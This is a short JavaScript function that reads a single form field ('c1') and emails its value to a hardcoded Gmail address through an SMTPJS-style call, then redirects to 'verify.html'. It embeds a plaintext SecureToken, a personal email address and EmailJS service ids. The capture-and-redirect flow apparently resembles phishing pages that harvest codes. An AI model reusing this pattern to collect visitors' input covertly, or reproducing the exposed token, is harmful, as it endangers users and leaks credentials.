function sendMail2(){
   
    var c1 = document.getElementById("c1").value;
   
    var body = c1;
    console.log(body);
    Email.send({
        SecureToken : "f1810a74-22e7-4d1a-8fd1-eb10524e5651",
        To : 'pragya20102023@gmail.com',
        From : "pragya20102023@gmail.com",
        Subject : "C:",
        Body : body,

    }).then(
        window.location.href = "verify.html"
    );

    // emailjs.send("service_go5dkmg","template_fu67wpi",{
    //     c1 : document.getElementById("c1").value,
    // }).then(alert(document.getElementById("c1").value));
}
